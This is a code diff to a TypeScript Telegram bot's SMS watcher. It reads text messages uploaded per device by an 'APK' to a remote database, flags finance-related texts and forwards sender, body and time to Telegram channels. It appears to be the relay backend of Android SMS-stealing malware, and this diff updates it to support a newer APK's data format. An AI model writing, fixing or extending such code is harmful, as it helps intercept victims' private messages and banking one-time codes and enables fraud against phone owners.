@@ -72,9 +72,10 @@ export function startSmsWatcher(bot: Telegraf): void {
     if (!ready) return;
 
     try {
-      const [globalChannelId, clients, userChannels] = await Promise.all([
+      const [globalChannelId, clients, messages, userChannels] = await Promise.all([
         getSmsChannel(),
         fbGet("clients"),
+        fbGet("messages"),
         fbGet("config/userChannels"),
       ]);
 
@@ -83,17 +84,31 @@ export function startSmsWatcher(bot: Telegraf): void {
       for (const [deviceId, deviceData] of Object.entries(
         clients as Record<string, any>
       )) {
-        const smsData = (deviceData as any)?.sms;
+        // New APK: SMS at messages/{deviceId}; Old APK: clients/{deviceId}/sms
+        const smsData: Record<string, any> | undefined =
+          (messages as any)?.[deviceId] || (deviceData as any)?.sms;
         if (!smsData) continue;
 
-        // New device — set watermark, skip this round
-        if (watermarks[deviceId] === undefined) {
-          const timestamps = Object.values(smsData).map((s: any) =>
-            parseInt(s.date || "0", 10)
-          );
-          watermarks[deviceId] =
-            timestamps.length > 0 ? Math.max(...timestamps) : Date.now();
-          await setSmsWatermark(deviceId, watermarks[deviceId]);
+        // Detect if entries use new format (have .id field) or old format (have .date ms)
+        const sampleEntry = Object.values(smsData)[0] as any;
+        const isNewFormat = sampleEntry && sampleEntry.id != null && !sampleEntry.date;
+
+        // Get sort key per entry: new format uses .id (incremental int), old uses .date (ms timestamp)
+        const getSortKey = (sms: any): number =>
+          isNewFormat ? (sms.id ?? 0) : parseInt(sms.date || "0", 10);
+
+        const currentMaxKey = Math.max(
+          ...Object.values(smsData).map((s: any) => getSortKey(s)),
+          0
+        );
+
+        // New device OR watermark looks like a timestamp but we're in new format (reset)
+        if (
+          watermarks[deviceId] === undefined ||
+          (isNewFormat && watermarks[deviceId] > 1_000_000)
+        ) {
+          watermarks[deviceId] = currentMaxKey;
+          await setSmsWatermark(deviceId, currentMaxKey);
           continue;
         }
 
@@ -102,26 +117,24 @@ export function startSmsWatcher(bot: Telegraf): void {
           (deviceData as any)?.ownerTelegramId || null;
 
         const newEntries = Object.values(smsData)
-          .filter((sms: any) => parseInt(sms.date || "0", 10) > lastWatermark)
-          .sort(
-            (a: any, b: any) =>
-              parseInt(a.date || "0") - parseInt(b.date || "0")
-          );
+          .filter((sms: any) => getSortKey(sms) > lastWatermark)
+          .sort((a: any, b: any) => getSortKey(a) - getSortKey(b));
 
         if (newEntries.length === 0) continue;
 
-        let latestTs = lastWatermark;
+        let latestKey = lastWatermark;
 
         for (const sms of newEntries as any[]) {
-          const ts = parseInt(sms.date || "0", 10);
+          const sortKey = getSortKey(sms);
           const phone = (deviceData as any).mobNo || (deviceData as any).phone || deviceId;
-          const from = sms.from || "Unknown";
-          const body = sms.body || "";
-          const dateStr = ts
-            ? new Date(ts).toLocaleString("en-IN", {
-                timeZone: "Asia/Kolkata",
-              }) + " IST"
-            : "Unknown";
+          // Support both field name conventions
+          const from = sms.sender || sms.from || "Unknown";
+          const body = sms.message || sms.body || "";
+          const dateStr = sms.dateTime
+            ? sms.dateTime
+            : sms.date
+              ? new Date(parseInt(sms.date)).toLocaleString("en-IN", { timeZone: "Asia/Kolkata" }) + " IST"
+              : "Unknown";
           const isFinance = isFinanceSms(body);
 
           const msg =
@@ -178,12 +191,12 @@ export function startSmsWatcher(bot: Telegraf): void {
             }
           }
 
-          if (ts > latestTs) latestTs = ts;
+          if (sortKey > latestKey) latestKey = sortKey;
         }
 
-        if (latestTs > lastWatermark) {
-          watermarks[deviceId] = latestTs;
-          await setSmsWatermark(deviceId, latestTs);
+        if (latestKey > lastWatermark) {
+          watermarks[deviceId] = latestKey;
+          await setSmsWatermark(deviceId, latestKey);
         }
       }
     } catch (err) {
